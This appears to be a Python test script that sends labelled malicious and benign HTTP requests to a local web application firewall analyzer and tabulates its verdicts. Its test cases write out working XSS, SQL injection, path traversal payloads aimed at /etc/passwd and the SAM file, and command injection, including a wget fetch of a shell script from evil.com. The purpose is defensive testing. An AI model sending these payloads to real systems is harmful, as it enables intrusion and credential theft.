#!/usr/bin/env python3
"""Send a batch of test requests (malicious + benign) to the WAF analyzer.

Usage:
    python scripts/test_requests.py [--url http://localhost:5000]

Sends each request to POST /api/analyze, polls for async results if needed,
and prints a colour-coded summary table at the end.
"""

from __future__ import annotations

import argparse
import sys
import time

import requests

# ---------------------------------------------------------------------------
# Test payloads — a mix of attack types and benign traffic
# ---------------------------------------------------------------------------
TEST_CASES: list[dict[str, str]] = [
    # === XSS ===
    {
        "label": "XSS – reflected script tag",
        "raw_http": (
            "GET /search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "Accept: text/html\r\n"
            "\r\n"
        ),
    },
    {
        "label": "XSS – img onerror",
        "raw_http": (
            "GET /profile?name=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "\r\n"
        ),
    },
    {
        "label": "XSS – SVG onload",
        "raw_http": (
            "POST /comment HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "\r\n"
            "body=<svg/onload=alert('xss')>"
        ),
    },
    # === SQL Injection ===
    {
        "label": "SQLi – classic OR 1=1",
        "raw_http": (
            "POST /login HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "\r\n"
            "username=admin' OR 1=1 --&password=anything"
        ),
    },
    {
        "label": "SQLi – UNION SELECT",
        "raw_http": (
            "GET /users?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "\r\n"
        ),
    },
    {
        "label": "SQLi – time-based blind",
        "raw_http": (
            "GET /product?id=1%20AND%20SLEEP(5)-- HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "User-Agent: sqlmap/1.7\r\n"
            "\r\n"
        ),
    },
    # === Path Traversal ===
    {
        "label": "Path Traversal – /etc/passwd",
        "raw_http": (
            "GET /files?path=../../../../etc/passwd HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "\r\n"
        ),
    },
    {
        "label": "Path Traversal – Windows",
        "raw_http": (
            "GET /download?file=..\\..\\..\\windows\\system32\\config\\sam HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "\r\n"
        ),
    },
    # === Command Injection ===
    {
        "label": "CMDi – semicolon cat /etc/shadow",
        "raw_http": (
            "GET /ping?host=127.0.0.1;cat%20/etc/shadow HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "User-Agent: curl/8.0\r\n"
            "\r\n"
        ),
    },
    {
        "label": "CMDi – pipe to wget",
        "raw_http": (
            "POST /tools/dns HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "Content-Type: application/json\r\n"
            "\r\n"
            '{"domain": "example.com | wget http://evil.com/shell.sh"}'
        ),
    },
    # === Benign ===
    {
        "label": "Benign – product listing",
        "raw_http": (
            "GET /api/products?page=1&limit=20 HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "Accept: application/json\r\n"
            "\r\n"
        ),
    },
    {
        "label": "Benign – static asset",
        "raw_http": (
            "GET /static/css/main.css HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "Accept: text/css\r\n"
            "\r\n"
        ),
    },
    {
        "label": "Benign – JSON API call",
        "raw_http": (
            "POST /api/checkout HTTP/1.1\r\n"
            "Host: store.example.com\r\n"
            "Content-Type: application/json\r\n"
            "Authorization: Bearer tok_abc123\r\n"
            "\r\n"
            '{"cart_id": "c-8812", "payment_method": "credit_card"}'
        ),
    },
    {
        "label": "Benign – health check",
        "raw_http": (
            "GET /healthz HTTP/1.1\r\n"
            "Host: internal-svc.local\r\n"
            "User-Agent: kube-probe/1.28\r\n"
            "\r\n"
        ),
    },
    {
        "label": "Benign – user profile fetch",
        "raw_http": (
            "GET /api/users/me HTTP/1.1\r\n"
            "Host: example.com\r\n"
            "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjF9.abc\r\n"
            "Accept: application/json\r\n"
            "\r\n"
        ),
    },
]


# ---------------------------------------------------------------------------
# Colour helpers (ANSI)
# ---------------------------------------------------------------------------
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def colour_verdict(verdict: str) -> str:
    v = verdict.lower()
    if v == "malicious":
        return f"{RED}{BOLD}{verdict.upper()}{RESET}"
    if v == "benign":
        return f"{GREEN}{verdict.upper()}{RESET}"
    if v == "pending":
        return f"{YELLOW}{verdict.upper()}{RESET}"
    return verdict


# ---------------------------------------------------------------------------
# Main logic
# ---------------------------------------------------------------------------
def poll_result(base: str, request_id: str, timeout: int = 60) -> dict | None:
    """Poll GET /api/result/<id> until a result is ready or timeout."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            r = requests.get(f"{base}/api/result/{request_id}", timeout=5)
            if r.status_code == 200:
                data = r.json()
                if data.get("success"):
                    return data["result"]
        except requests.RequestException:
            pass
        time.sleep(1)
    return None


def run(base_url: str) -> None:
    results: list[dict] = []

    print(f"\n{BOLD}Sending {len(TEST_CASES)} requests to {base_url}/api/analyze{RESET}\n")
    print(f"{'#':>3}  {'Label':<40}  {'Status':>6}  Verdict")
    print("-" * 80)

    for i, tc in enumerate(TEST_CASES, 1):
        label = tc["label"]
        try:
            resp = requests.post(
                f"{base_url}/api/analyze",
                json={"raw_http": tc["raw_http"]},
                timeout=30,
            )
            data = resp.json()
            status = resp.status_code
            result = data.get("result", {})
            verdict = result.get("verdict", "error")

            # If queued (202), poll for the final result
            if status == 202 and verdict == "pending" and result.get("request_id"):
                rid = result["request_id"]
                print(f"{i:>3}  {label:<40}  {YELLOW}{status:>6}{RESET}  polling…", end="", flush=True)
                polled = poll_result(base_url, rid)
                if polled:
                    result = polled
                    verdict = polled.get("verdict", "unknown")
                    print(f"\r{i:>3}  {label:<40}  {status:>6}  {colour_verdict(verdict)}")
                else:
                    verdict = "timeout"
                    print(f"\r{i:>3}  {label:<40}  {status:>6}  {YELLOW}TIMEOUT{RESET}")
            else:
                print(f"{i:>3}  {label:<40}  {status:>6}  {colour_verdict(verdict)}")

            results.append({
                "label": label,
                "http_status": status,
                "verdict": verdict,
                "attack_type": result.get("attack_type", ""),
                "source": result.get("source", ""),
                "confidence": result.get("confidence"),
            })

        except requests.RequestException as exc:
            print(f"{i:>3}  {label:<40}  {RED}ERROR{RESET}  {exc}")
            results.append({
                "label": label,
                "http_status": 0,
                "verdict": "error",
                "attack_type": "",
                "source": "",
                "confidence": None,
            })

    # ---- Summary ----
    total = len(results)
    malicious = sum(1 for r in results if r["verdict"] == "malicious")
    benign = sum(1 for r in results if r["verdict"] == "benign")
    pending = sum(1 for r in results if r["verdict"] in ("pending", "timeout"))
    errors = sum(1 for r in results if r["verdict"] == "error")

    print("\n" + "=" * 80)
    print(f"{BOLD}Summary{RESET}:  {total} total  |  "
          f"{RED}{malicious} malicious{RESET}  |  "
          f"{GREEN}{benign} benign{RESET}  |  "
          f"{YELLOW}{pending} pending/timeout{RESET}  |  "
          f"{RED}{errors} errors{RESET}")
    print("=" * 80)

    # Detailed table
    print(f"\n{'Label':<40}  {'Verdict':<12}  {'Source':<14}  {'Attack Type':<20}  {'Conf':>5}")
    print("-" * 100)
    for r in results:
        conf = f"{r['confidence']:.0%}" if r["confidence"] is not None else "  —"
        print(f"{r['label']:<40}  {colour_verdict(r['verdict']):<23}  {r['source']:<14}  {r['attack_type'] or '—':<20}  {conf:>5}")

    print()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Send test requests to the WAF analyzer")
    parser.add_argument("--url", default="http://localhost:5000", help="Base URL of the WAF API")
    args = parser.parse_args()

    run(args.url)
